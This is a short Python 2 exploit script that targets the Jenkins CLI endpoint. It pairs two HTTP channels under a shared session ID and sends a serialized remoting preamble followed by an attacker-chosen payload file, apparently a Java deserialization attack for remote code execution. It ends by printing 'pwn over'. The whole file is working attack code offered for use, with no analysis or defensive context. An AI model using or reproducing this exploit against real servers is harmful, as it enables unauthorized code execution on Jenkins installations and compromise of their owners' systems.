# coding:utf-8
'''
    @author: dream9
'''
import sys
import uuid
import time
import requests
import binascii
import threading

proxies = {
#            'http':'http://192.168.0.58:8086'
           }
headers = {
           'Connection':'keep-alive',
           'Accept':'*/*',
           'User-Agent':'Mozilla/7.0  AppleWebKit/862.78 (KHTML, like dream9) Chrome/88.5.3629.14 Safari/862.78'
           }

url = sys.argv[1]       # example: http://192.168.0.58:8080/jenkins/cli  [At the end there is no "/"]
payload_file = sys.argv[2]  

def download(session):
    headers['Side'] = 'download'
    headers['Session'] = session
    headers['Content-type'] = 'application/x-www-form-urlencoded'
    requests.post(url,headers=headers,data='',proxies=proxies)

def upload(session):
    headers['Side'] = 'upload'
    headers['Session'] = session
    headers['Cache-Control'] = 'no-cache'
    headers['Content-type'] = 'application/octet-stream'
    data = '<===[JENKINS REMOTING CAPACITY]===>rO0ABXNyABpodWRzb24ucmVtb3RpbmcuQ2FwYWJpbGl0eQAAAAAAAAABAgABSgAEbWFza3hwAAAAAAAAAH4=\x00\x00\x00\x00'
    payload = open(payload_file,'rb').read()
    requests.post(url,headers=headers,data=data+payload,proxies=proxies)
    
def check():
    print '\n[*] start......'
    session = str(uuid.uuid4())
    download_thread = threading.Thread(target=download,args=(session,)) 
    download_thread.start()
    time.sleep(1)
    upload(session)
    print '[*] pwn over'

if __name__ == '__main__':
    check()